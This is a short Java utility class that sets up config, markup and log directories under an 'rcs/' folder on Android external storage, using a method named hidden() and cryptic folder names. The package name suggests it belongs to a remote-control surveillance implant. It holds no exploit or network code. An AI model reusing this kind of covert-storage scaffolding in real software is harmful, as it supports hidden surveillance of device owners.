package com.ht.RCSAndroidGUI.file;

import java.io.File;

import android.os.Environment;
import android.util.Log;

public class Path {

	private static final String TAG = "PATH";

	private static final String CONF_DIR = "cdd/";
    //public static final String DEBUG_DIR = "dwm/";
    private static final String MARKUP_DIR = "msdd/";
	private static final String LOG_DIR = "ldd/";
	
    //public static final String UPLOAD_DIR = "";

	public static String hidden() {
		return Environment.getExternalStorageDirectory()+"/"+"rcs/";
	}
	
	public static boolean makeDirs(){
		
		try {
			createDirectory(conf());
			createDirectory(markup());
			createDirectory(logs());

			return true;
		} catch (Exception e) {
			Log.e(TAG,e.toString());
		}
		return false;
	}
	
	public static String conf() {
		return hidden()+CONF_DIR;
	}
	
	public static String markup() {
		return hidden()+MARKUP_DIR;
	}

	public static String logs() {
		 return hidden()+LOG_DIR;
	}

	public static boolean removeDirectory(String dir) {
		File file = new File(dir);
		return file.delete(); //TODO: anche su directory piene!
	}

	public static boolean createDirectory(String dir) {
		File file = new File(dir);
		file.mkdirs();
		return file.exists() && file.isDirectory();
	}

	public static long freeSpace() {
		// TODO Auto-generated method stub
		return Long.MAX_VALUE;
	}



}
